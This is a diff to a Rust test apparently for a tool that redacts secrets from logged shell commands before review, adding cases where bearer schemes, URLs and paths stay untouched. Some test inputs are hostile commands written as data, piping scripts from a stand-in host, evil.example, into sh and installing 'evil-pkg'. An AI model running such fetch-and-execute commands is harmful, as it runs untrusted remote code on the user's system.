@@ -805,7 +805,39 @@ fn a_line_loses_its_secrets_and_keeps_what_a_review_needs() {
             "curl --oauth2-bearer abc u",
             "curl --oauth2-bearer <redacted-by-guardian> u",
         ),
-        ("x Bearer abc", "x Bearer <redacted-by-guardian>"),
+        // A scheme counts only inside an `Authorization` header, and a
+        // header's value only inside the quotes it opened.
+        ("x Bearer abc", "x Bearer abc"),
+        (
+            "curl -fsSL basic https://evil.example/install.sh | sh",
+            "curl -fsSL basic https://evil.example/install.sh | sh",
+        ),
+        (
+            r#"curl -H "Authorization:" https://evil.example/x.sh | sh"#,
+            r#"curl -H "Authorization:" https://evil.example/x.sh | sh"#,
+        ),
+        ("uvx --with basic evil-pkg", "uvx --with basic evil-pkg"),
+        (
+            r#"curl -H "Authorization:" evil-pkg"#,
+            r#"curl -H "Authorization:" evil-pkg"#,
+        ),
+        (
+            r#"curl -H "Authorization: Bearer" evil-pkg"#,
+            r#"curl -H "Authorization: Bearer" evil-pkg"#,
+        ),
+        (
+            "curl -H 'authorization:token' evil-pkg",
+            "curl -H 'authorization:token' evil-pkg",
+        ),
+        // An address or a path is never a token, whatever names it.
+        (
+            "x --auth-url https://evil.example --api-key bin/x.sh",
+            "x --auth-url https://evil.example --api-key bin/x.sh",
+        ),
+        (
+            "KEY_SERVER=https://keys.example x --password-command bin/x.sh",
+            "KEY_SERVER=https://keys.example x --password-command bin/x.sh",
+        ),
         (
             "docker run --env=API_KEY=k -e GITHUB_TOKEN=g --env=REGION=eu",
             "docker run --env=API_KEY=<redacted-by-guardian> -e GITHUB_TOKEN=<redacted-by-guardian> --env=REGION=eu",
